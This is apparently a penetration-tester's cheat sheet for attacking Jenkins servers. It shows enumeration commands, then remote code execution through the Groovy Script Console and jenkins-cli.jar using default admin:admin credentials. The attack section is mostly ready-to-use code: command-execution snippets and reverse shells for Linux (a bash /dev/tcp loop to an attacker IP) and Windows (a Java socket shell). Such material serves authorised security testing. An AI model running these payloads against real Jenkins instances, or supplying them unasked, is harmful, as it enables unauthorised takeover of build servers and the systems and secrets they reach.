### Content

- [Enumeration](#enumeration)
- [Attacks](#attacks)
	- [RCE](#rce)
		- [GUI](#gui)
		- [CLI - jenkins-cli.jar](#cli---jenkins-cli.jar)

> [!Note]
> 
> - Runs on port 8080 by default.
> - Port 5000 is used for the communication between the master server and slave servers.
> - Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. `/configureSecurity/`
> - Administrators can allow or disallow users from creating accounts.

---
### Enumeration

```bash
# Footprinting and disovering Jenkins
curl http://FQDN/login
# Try to download the CLI utility
wget http://FQDN/jnlpJars/jenkins-cli.jar

# Version
# The version will be displayed in the bottom right part of the footer of any page after log in
# Or
# If you donwloaded the CLI utility
java -jar jenkins-cli.jar -s http://FQDN/ -auth <USER>:<PASS> -webSocket version
```

---
### Attacks
#### RCE

Go to the bottom of the `Manage Jenkins` page, to `Tools and Actions`, visit `Script Console`.

- The script console can be reached directly at the URL `http://FQDN/script`.
- This console allows a user to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts, which are an object-oriented Java-compatible language. The language is similar to Python and Ruby.
- Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.

###### GUI

Execute a certain command:

```groovy
// Linux
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

// Windows
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Reverse shell:

```Groovy
// Linux
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

// Windows
String host="localhost";
int port=<PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

###### CLI - jenkins-cli.jar

We can also use `jenkins-cli.jar`:

```bash
wget http://FQDN/jnlpJars/jenkins-cli.jar

java -jar jenkins-cli.jar -s http://FQDN/ -auth admin:admin groovy = << 'EOF'
println "ls /".execute().text
EOF

java -jar jenkins-cli.jar -s http://FQDN/ -auth admin:admin groovy = << 'EOF'
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<Attacker-IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
EOF
```

---
